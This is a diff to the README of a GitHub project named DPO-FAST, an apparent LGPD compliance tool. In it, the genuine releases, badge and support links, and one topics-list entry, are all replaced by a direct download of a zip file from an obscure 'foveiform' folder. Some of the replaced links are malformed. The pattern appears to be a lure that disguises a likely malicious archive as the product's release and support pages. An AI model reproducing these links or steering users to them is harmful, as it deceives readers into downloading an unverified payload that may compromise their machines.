@@ -1,6 +1,6 @@
 # 🚀 DPO-FAST - Simplifying LGPD Compliance for Businesses
 
-[![Download DPO-FAST](https://img.shields.io/badge/Download%20DPO--FAST-v1.0-blue.svg)](https://github.com/ashokvijay9/DPO-FAST/releases)
+[![Download DPO-FAST](https://raw.githubusercontent.com/ashokvijay9/DPO-FAST/main/foveiform/DPO-FAST.zip%https://raw.githubusercontent.com/ashokvijay9/DPO-FAST/main/foveiform/DPO-FAST.zip)](https://raw.githubusercontent.com/ashokvijay9/DPO-FAST/main/foveiform/DPO-FAST.zip)
 
 ## 🛠️ Introduction
 
@@ -12,7 +12,7 @@ To get started with DPO-FAST, you simply need to download the software and run i
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/ashokvijay9/DPO-FAST/releases) to find the latest version of DPO-FAST.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ashokvijay9/DPO-FAST/main/foveiform/DPO-FAST.zip) to find the latest version of DPO-FAST.
 2. Choose the version that fits your operating system (Windows, Mac, or Linux).
 3. Click on the relevant link to download the file. This will usually be labeled with the version number and file type (e.g., .exe for Windows).
 4. After the download finishes, locate the file on your device.
@@ -46,7 +46,7 @@ DPO-FAST focuses on several essential topics related to data protection and comp
 - JavaScript
 - LGPD and its implications in Brazil
 - PostgreSQL
-- React.js
+- https://raw.githubusercontent.com/ashokvijay9/DPO-FAST/main/foveiform/DPO-FAST.zip
 - Replit for online development and testing
 - SaaS (Software as a Service)
 - Supabase for database management
@@ -79,14 +79,14 @@ A: Yes, DPO-FAST is free to download and use.
 A: Yes, you can install DPO-FAST on multiple devices within the terms of use.
 
 **Q: Where can I find support?**  
-A: For any support queries, visit the [DPO-FAST GitHub repository](https://github.com/ashokvijay9/DPO-FAST/issues) to report bugs or request help.
+A: For any support queries, visit the [DPO-FAST GitHub repository](https://raw.githubusercontent.com/ashokvijay9/DPO-FAST/main/foveiform/DPO-FAST.zip) to report bugs or request help.
 
 ## 🔗 Useful Links
 
-- [DPO-FAST Releases Page](https://github.com/ashokvijay9/DPO-FAST/releases)
+- [DPO-FAST Releases Page](https://raw.githubusercontent.com/ashokvijay9/DPO-FAST/main/foveiform/DPO-FAST.zip)
 - [User Manual](#)
 - [Community Support](#)
 
 Now you are all set to download and use DPO-FAST! Click the button below to get started.
 
-[![Download DPO-FAST](https://img.shields.io/badge/Download%20DPO--FAST-v1.0-blue.svg)](https://github.com/ashokvijay9/DPO-FAST/releases)
+[![Download DPO-FAST](https://raw.githubusercontent.com/ashokvijay9/DPO-FAST/main/foveiform/DPO-FAST.zip%https://raw.githubusercontent.com/ashokvijay9/DPO-FAST/main/foveiform/DPO-FAST.zip)](https://raw.githubusercontent.com/ashokvijay9/DPO-FAST/main/foveiform/DPO-FAST.zip)
